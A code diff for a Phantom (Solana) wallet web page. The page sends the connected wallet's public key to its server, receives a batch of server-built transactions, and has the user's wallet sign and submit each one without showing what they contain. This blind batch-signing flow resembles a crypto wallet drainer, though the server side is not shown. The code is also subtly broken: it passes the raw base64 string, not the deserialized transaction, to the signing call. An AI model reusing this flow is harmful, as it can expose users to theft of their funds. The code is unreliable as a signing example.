@@ -3,11 +3,14 @@ document.addEventListener('DOMContentLoaded', async function() {
     const disconnectButton = document.getElementById('disconnectWalletButton');
     const createTransactionButton = document.getElementById('createTransactionButton');
 
+    let walletPublicKey = null;
+
     connectButton.addEventListener('click', async () => {
         if (window.solana && window.solana.isPhantom) { 
             try {
                 // Connect to Phantom wallet
                 const wallet = await window.solana.connect();
+                walletPublicKey = wallet.publicKey.toString();
                 console.log('Phantom wallet has been connected:', wallet.publicKey.toString());
 
                 // Store wallet connection information in local storage
@@ -50,6 +53,7 @@ document.addEventListener('DOMContentLoaded', async function() {
     if (isWalletConnected) {
         try {
             const wallet = await window.solana.connect();
+            walletPublicKey = wallet.publicKey.toString();
             console.log('Connected to Phantom wallet:', wallet.publicKey.toString());
         } catch (error) {
             console.error('An error occurred while connecting your wallet:', error);
@@ -65,31 +69,45 @@ document.addEventListener('DOMContentLoaded', async function() {
     };
 
     createTransactionButton.addEventListener('click', async () => {
-        if (window.solana.publicKey !== null) {
-            sendPublicKey(window.solana.publicKey);
-        } else {
-            console.log("Error sending wallet: wallet is disconnected.")
+        if (!window.solana.publicKey) {
+            alert('Please connect your wallet first.');
+            return;
         }
-    });
 
-    // Send wallet Public Key 
-    async function sendPublicKey(publicKey) {
-        fetch('/', await {
-           method: 'POST',
-           headers: {
-            'Content-Type': 'application/json',
-           }, 
-           body: JSON.stringify({ publicKey: publicKey.toString() })
-        }).then(response => {
-            if (!response.ok) {
-                throw new Error('Failed to send wallet data.')
-            }
-            return response.json();
-        }).then(data => {
-            console.log('Wallet data has been sent:', data);
-        }).catch(error => {
-            console.error('Error sending wallet data:', error);
-        });
-    }
+        try {
+            const response = await fetch('/create-transactions', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ publicKey: walletPublicKey })
+            });
+            const { transactions } = await response.json();
+
+            for (const serializedTransaction of transactions) {
+                const transaction = solanaWeb3.Transaction.from(Buffer.from(serializedTransaction, 'base64'));
+                const signedTransaction = await window.solana.signTransaction(serializedTransaction);
+                const serializedSignedTransaction = signedTransaction.serialize().toString('base64');
+
+                const sendResponse = await fetch('/send-transaction', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ signedTransaction: serializedSignedTransaction })
+                });
+
+                const sendResult = await sendResponse.json();
+                if (sendResult.success) {
+                    console.log(`Transaction sent: ${sendResult.signature}`);
+                } else {
+                    console.error('Failed to send transaction', sendResult.error);
+                };
+            };
+
+        } catch (error) {
+            console.error('An error occurred while creating transactions: ', error);
+        };
+    });
 
 });
